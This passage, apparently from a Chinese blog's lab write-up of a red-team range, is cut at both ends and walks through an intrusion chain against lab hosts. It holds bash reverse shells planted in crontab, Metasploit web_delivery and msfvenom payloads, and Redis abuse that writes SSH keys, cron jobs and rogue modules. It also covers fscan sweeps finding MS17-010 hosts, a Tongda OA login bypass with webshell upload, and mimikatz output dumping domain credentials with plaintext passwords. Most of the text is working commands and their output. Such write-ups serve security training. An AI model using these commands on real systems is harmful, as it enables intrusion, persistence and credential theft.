/jeff</span><br></pre></td></tr></table></figure></li><li><p>将反弹shell等写入计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/10.131.210.172/4666 0&gt;&amp;1&quot; &gt;/jeff/jeff.sh</span><br><span class="line">echo &quot;* * * * * root bash /jeff.sh&quot; &gt;&gt; /jeff/etc/crontab</span><br></pre></td></tr></table></figure></li><li><p>成功</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714145429570.png" alt="image-20230714145429570" /></p></li></ol><p>当然，我们可以通过写入计划任务的方式在宿主机执行metasploit生成的命令。它就是ubuntu2</p><p>首先使用metasploit的web_delivery模块生成payload命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 6    # 选择目标系统</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.131.210.172</span><br><span class="line">set lport 8023</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后OK</p><h1 id="ubuntu1主机上线msf"><a class="markdownIt-Anchor" href="#ubuntu1主机上线msf"></a> Ubuntu1主机上线msf</h1><p>因为逃逸的关系，所以直接打上ubuntu2了，但是ubuntu1的权限该拿还得拿，发现之前有个redis，还有ssh，那估计就是redis写ssh密钥来获取权限了。（他没有运行什么脚本，不能上传webshell，当然，写计划任务反弹shell也行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.基本命令：</span><br><span class="line">        查看数据库中的内容：keys * （redis数据库没有表，是大量的键值对组成的）</span><br><span class="line">        添加键值对：set qiao wang（意思为键为qiao，值为wang），输入get qiao，会输出wang</span><br><span class="line">        删除键值对：del qiao</span><br></pre></td></tr></table></figure><h2 id="redis写入ssh"><a class="markdownIt-Anchor" href="#redis写入ssh"></a> redis写入ssh</h2><p>影响版本小于redis-4.0.10，而这个redis是2.8版本的，完全OK</p><p>生成ssh密钥对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>然后连接受害主机的redis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ redis-cli -h 10.131.210.214</span><br><span class="line">10.131.210.214:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/home/web&quot;</span><br><span class="line">10.131.210.214:6379&gt; config set dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/root/.ssh&quot;</span><br><span class="line">10.131.210.214:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; set xz &quot;\n\n\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgvTycRe11wx+3Q+UqCBCVJB9LYwUEk9h5+b7Ul3QJ8Kgwo7SLYnSNFBdPwEFoovPAiu8U5ez8F9ZINWHrCVdFAdS/Dwk/plmTUfySkeohYFvAtyVY7va1boqEFbBqH+Y8NnAPMvJrKS9ooV4PcFlPVyNTJEMAsthIXOTpZxtPyYjntdTMZUnz2blq2uolqyPcwh6xQ2CrYaJcbOhoGDHIa7N6HzknJ0RMuXUGaZdgxHGCr+m6UW2IVobDtUEGDRQEyynbfE54P6kMNiIsDdlT2KkZpyWBMCEP0ouI79puC9zPOkac3wP6gpFy2cv2GehcbKc1V2WSNtfW/b0I8M7QmSrmh4Vd3O4vGpFRsh9pY/DLqpyYXuHHuPFgZlHU4m0fF+/bmWG72I1ywYJm+1v2EFmydjcaCkq9qCAb89DqeAh9qQXEIDbgekqxcRRIeQ5lRMrfRrU+uAfkLaUot9UTx6NePMSufPPVFo6pSh0Z1rhFZh0QorMlRZpOa6U7WBc= j3fffff@j3fffff  \n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; </span><br></pre></td></tr></table></figure><p>然后连接ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">──(j3fffff㉿j3fffff)-[/root/.ssh]</span><br><span class="line">└─$ ssh -i /home/j3fffff/.ssh/red_team_rsa root@10.131.210.214</span><br></pre></td></tr></table></figure><h2 id="写入计划任务"><a class="markdownIt-Anchor" href="#写入计划任务"></a> 写入计划任务</h2><pre><code>10.131.210.214:6379&gt; config set dir /var/spool/cron10.131.210.214:6379&gt; set h4ck &quot;\n * * * * * bash -i &gt;&amp; /dev/tcp/10.131.210.172/4667 0&gt;&amp;1 \n&quot;10.131.210.214:6379&gt; save</code></pre><p>但是不知道为啥会乱码，不成功</p><h2 id="主从复制"><a class="markdownIt-Anchor" href="#主从复制"></a> 主从复制</h2><p>使用项目：<code>https://github.com/Dliv3/redis-rogue-server</code></p><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">适用于目标Redis服务处于外网的情况</span><br><span class="line"></span><br><span class="line">    外网Redis未授权访问</span><br><span class="line">    已知外网Redis口令</span><br><span class="line"></span><br><span class="line">启动redis rogue server，并主动连接目标redis服务发起攻击</span><br><span class="line"></span><br><span class="line">python3 redis-rogue-server.py --rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">    --rpasswd 如果目标Redis服务开启了认证功能，可以通过该选项指定密码</span><br><span class="line">    --rhost 目标redis服务IP</span><br><span class="line">    --rport 目标redis服务端口，默认为6379</span><br><span class="line">    --lhost vps的外网IP地址</span><br><span class="line">    --lport vps监控的端口，默认为21000</span><br><span class="line"></span><br><span class="line">攻击成功之后，你会得到一个交互式shell</span><br></pre></td></tr></table></figure><p>攻击步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python redis_rogue_server.py -v(攻击机)</span><br><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename moudle.so</span><br><span class="line">slaveof ip port（端口是脚本启动的端口）</span><br><span class="line">module load ./moudle.so</span><br><span class="line">slaveof NO ONE（断掉主从模式）</span><br><span class="line">nc -lvvp port（攻击机）</span><br><span class="line">system.rev ip port（反弹shell接收的端口）</span><br></pre></td></tr></table></figure><p>此时可以使用命令：<a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; system.exec &quot;id&quot;</span><br><span class="line">&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; system.exec &quot;whoami&quot;</span><br><span class="line">&quot;root\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; system.rev 127.0.0.1 9999</span><br></pre></td></tr></table></figure><p>假如redis在内网，需要使用ssrf来控制主机主动连接我们的恶意主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">被动连接模式</span><br><span class="line">适用于目标Redis服务处于内网的情况</span><br><span class="line"></span><br><span class="line">    通过SSRF攻击Redis</span><br><span class="line">    内网Redis未授权访问/已知Redis口令, Redis需要反向连接redis rogue server</span><br></pre></td></tr></table></figure><p>但是我这没成功，返回<code>[-&gt;] b&quot;-ERR unknown command 'MODULE'\r\n&quot;</code></p><h1 id="ubuntu2主机上线msf"><a class="markdownIt-Anchor" href="#ubuntu2主机上线msf"></a> Ubuntu2主机上线msf</h1><p>赶紧写ssh密钥啊！先上线meterpreter!</p><p>使用 <code>post/multi/manage/shell_to_meterpreter </code>模块来将 shell 升级为 meterpreter。</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714152845811.png" alt="image-20230714152845811" /></p><h2 id="信息搜集-2"><a class="markdownIt-Anchor" href="#信息搜集-2"></a> 信息搜集</h2><p>当连接4666端口时，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Command shell session 1 opened (10.131.210.172:4666 -&gt; 10.131.210.104:8099) at 2023-07-17 10:28:06 +0800</span><br></pre></td></tr></table></figure><p>然后搜集网卡信息，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">br-05384b1b0df2 Link encap:Ethernet  HWaddr 02:42:a5:2b:31:45  </span><br><span class="line">          inet addr:172.18.0.1  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">br-1d665e13ee58 Link encap:Ethernet  HWaddr 02:42:fe:3c:7e:8b  </span><br><span class="line">          inet addr:172.20.0.1  Bcast:172.20.255.255  Mask:255.255.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:a1:6e:d8  </span><br><span class="line">          inet addr:192.168.52.20  Bcast:192.168.52.255  Mask:255.255.255.0</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0c:29:a1:6e:e2  </span><br><span class="line">          inet addr:192.168.93.10  Bcast:192.168.93.255  Mask:255.255.255.0</span><br></pre></td></tr></table></figure><p>算了，还是直接上传linenum，直接扫吧</p><p>发现域名：<a href="http://www.rebootuser.com">www.rebootuser.com</a></p><p>系统内核：Linux ubuntu 4.4.0-142-generic （脏牛：&gt;=2.6.22）Ubuntu 14.04.6 LTS（这个好像有漏洞）</p><p>因为之前写了一个用户，所以知道</p><ul><li>ubuntu</li><li>jeff / abc123</li></ul><p>计划任务</p><ul><li>/etc/crontab</li><li>/etc/cron.daily</li><li>/etc/cron.d</li></ul><p>nameserver 192.168.52.2</p><p>端口：22（ssh） 631（？） 8000（docker）</p><p>历史记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2018-12613</span><br><span class="line">ls</span><br><span class="line">cd phpmyadmin/</span><br><span class="line"></span><br><span class="line">redis-2.8.17</span><br></pre></td></tr></table></figure><h2 id="写ssh密钥"><a class="markdownIt-Anchor" href="#写ssh密钥"></a> 写ssh密钥</h2><p>下载配置文件：<code>/etc/ssh/sshd_config</code>里面的配置，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">#AuthorizedKeysFile%h/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>这不行，需要把最后一个给注释掉，然后把我们的密钥写上（已经上传）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat red_team_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line"># 重启</span><br><span class="line">service ssh restart</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714155117566.png" alt="image-20230714155117566" /></p><p>好像还是不行，我们添加用户就以这台主机打吧</p><h2 id="上传fscan扫内网"><a class="markdownIt-Anchor" href="#上传fscan扫内网"></a> 上传fscan扫内网</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 192.168.52.1/24 -o result.txt</span><br><span class="line">./fscan_amd64 -h 192.168.93.1/24 -o 93fs.txt</span><br><span class="line">(icmp) Target 192.168.93.10   is alive</span><br><span class="line">(icmp) Target 192.168.93.20   is alive</span><br><span class="line">(icmp) Target 192.168.93.30   is alive</span><br><span class="line">(icmp) Target 192.168.93.40   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">192.168.93.30:139 open</span><br><span class="line">192.168.93.20:139 open</span><br><span class="line">192.168.93.40:135 open</span><br><span class="line">192.168.93.30:135 open</span><br><span class="line">192.168.93.20:135 open</span><br><span class="line">192.168.93.10:22 open</span><br><span class="line">192.168.93.40:445 open</span><br><span class="line">192.168.93.30:445 open</span><br><span class="line">192.168.93.20:445 open</span><br><span class="line">192.168.93.40:139 open</span><br><span class="line">192.168.93.20:8080 open</span><br><span class="line">192.168.93.10:8000 open</span><br><span class="line">192.168.93.30:88 open</span><br><span class="line">192.168.93.20:1099 open</span><br><span class="line">[*] alive ports len is: 14</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.93.30</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]192.168.93.30</span><br><span class="line">[*] NetBios: 192.168.93.30   [+]DC DC.whoamianony.org            Windows Server 2012 R2 Datacenter 9600 </span><br><span class="line">[+] 192.168.93.40       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[+] 192.168.93.30       MS17-010        (Windows Server 2012 R2 Datacenter 9600)</span><br><span class="line">[*] NetBios: 192.168.93.40   PC2.whoamianony.org                 Windows 7 Professional 7601 Service Pack 1 </span><br><span class="line">[+] 192.168.93.20       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle: http://192.168.93.20:8080 code:200 len:10065  title:通达OA网络智能办公系统</span><br><span class="line">[+] InfoScan:http://192.168.93.20:8080 [通达OA] </span><br><span class="line">[+] http://192.168.93.20:8080 tongda-user-session-disclosure </span><br><span class="line">[*] WebTitle: http://192.168.93.10:8000 code:200 len:17474  title:Laravel</span><br></pre></td></tr></table></figure><p>有四台主机，其中，3台可以用ms17-010，能不能用成功是另外一回事了，先打通达OA那台主机</p><h1 id="pc-1"><a class="markdownIt-Anchor" href="#pc-1"></a> PC-1</h1><p>设置http代理后，我们可以访问网页：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721100733862.png" alt="image-20230721100733862" /></p><p>先试试ms17-010吧，如果能打进去就好了。用proxychain代理另一个msf（虽然可以添加路由，但是session经常断，还是frp好用）</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721101735016.png" alt="image-20230721101735016" /></p><p>不行，那就通达OA漏洞冲。</p><p>访问：<a href="http://192.168.52.30:8080/ispirit/login_code.php">http://192.168.52.30:8080/ispirit/login_code.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;codeuid&quot;:&quot;&#123;F8C47480-79AC-099A-23E5-51593824A37E&#125;&quot;,&quot;authcode&quot;:&quot;LOGIN_CODEf792IO1xwD6Q4V7CHsuypdP2suN41iyt3d48vRzGFr04F8vjQO+gWBgQzVUeO0h0MXBPWDz3UwFDGcfEmFm8e2R\/uLGwlgDJen0kNggrKUGP0cCsh9PJzmS\/Qucx6rAzPniW\/vXiINWtGO1QGnj5r9J9cKsY&quot;&#125;</span><br></pre></td></tr></table></figure><p>访问：<a href="http://192.168.52.30:8080//logincheck_code.php">http://192.168.52.30:8080//logincheck_code.php</a></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721104536431.png" alt="image-20230721104536431" /></p><p>更改对应：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721105246123.png" alt="image-20230721105246123" /></p><p>访问：<a href="http://192.168.52.30:8080/general/index.php?isIE=0&amp;modify_pwd=0%EF%BC%8C%E5%A1%AB%E4%B8%8A%E5%AF%B9%E5%BA%94%E7%9A%84COOKIE%EF%BC%8C%E7%BB%95%E8%BF%87%EF%BC%9A">http://192.168.52.30:8080/general/index.php?isIE=0&amp;modify_pwd=0，填上对应的COOKIE，绕过：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: PHPSESSID=h1eha4jn67kshkshaq58m5f8k3; path=/</span><br></pre></td></tr></table></figure><p>失败了，emmmm，仔细看了一下：<strong>前台通过遍历UID找到在线的人员后，获取phpsession后即可登录</strong>，好把，我先登录～因为是遍历，难怪我弄不成功。</p><p>使用脚本：<a href="https://github.com/z1un/TongdaOA-exp%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%A5%BDshell%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%B0%E8%9D%8E%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E8%BF%9E%E4%B8%8A">https://github.com/z1un/TongdaOA-exp，上传好shell，然后冰蝎设置代理连上</a></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721110846926.png" alt="image-20230721110846926" /></p><p>然后上线msf，发现它能ping我们，也就是能连外网，冲</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111244409.png" alt="image-20230721111244409" /></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111757397.png" alt="image-20230721111757397" /></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111822064.png" alt="image-20230721111822064" /></p><p>下一步，信息搜集+提权+权限维持+横向移动</p><p>发现：php/meterpreter/reverse_tcp对于meterpreter的限制好大，没办法进入shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; route</span><br><span class="line">[-] The &quot;route&quot; command is not supported by this Meterpreter type (php/windows)</span><br></pre></td></tr></table></figure><p>赶紧上线一个exe吧，受不了了。上线成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">冰蝎上传：msfvenom -p windows/meterpreter/reverse_tcp lhost=10.131.210.172 lport=4706 -f exe -o 4706.exe</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721140617156.png" alt="image-20230721140617156" /></p><h2 id="信息搜集-3"><a class="markdownIt-Anchor" href="#信息搜集-3"></a> 信息搜集</h2><p>checklist：</p><ul><li>权限</li><li>架构/系统类型/补丁</li><li>哈希/密码/配置信息</li><li>网络信息/配置/网卡</li><li>端口/服务</li></ul><p>上面说到了，有3个网卡，之前fscan也扫到：192.168.93.30是DC，40是PC2。因为已经是system权限，所以不考虑提权，还是可以看看有什么可以用的漏洞，利用<code>post/windows/gather/enum_patches </code>模块 可以根据漏洞编号快速找出系统中缺少的补丁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HotFix ID  Install Date</span><br><span class="line">---------  ------------</span><br><span class="line">KB2534111  8/25/2019</span><br><span class="line">KB2999226  9/15/2019</span><br><span class="line">KB958488   8/29/2019</span><br><span class="line">KB976902   11/21/2010</span><br></pre></td></tr></table></figure><p>哈希信息的话，用Kiwi（操作<a href="https://blog.csdn.net/m0_53087192/article/details/112707016">参考</a>）抓一下：发现kiwi的只是支持86的，好废物（原来是我的Payload设置错了，需要设置成x64的），还是自己下载传上去吧。<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe sekurlsa::logonpasswords</span><br><span class="line">Authentication Id : 0 ; 1591357 (00000000:0018483d)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2023/7/21 9:22:02</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * LM       : 56b0cd8b125c05055e2dd9e955f18034</span><br><span class="line">         * NTLM     : ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line">         * SHA1     : 2bc4124300a6a8fc0ca10891823d36c64e4b3a40</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Whoami2021</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Whoami2021</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : Whoami2021</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1243251 (00000000:0012f873)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : bunny</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2023/7/21 9:19:38</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-1112</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * LM       : 7de10bf327ef7f2ac6ebe8776a153feb</span><br><span class="line">         * NTLM     : cc567d5556030b7356ee4915ff098c8f</span><br><span class="line">         * SHA1     : 3747632756191e3350e53211c63f804eb163638f</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:10</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : PC1$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:10</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * NTLM     : 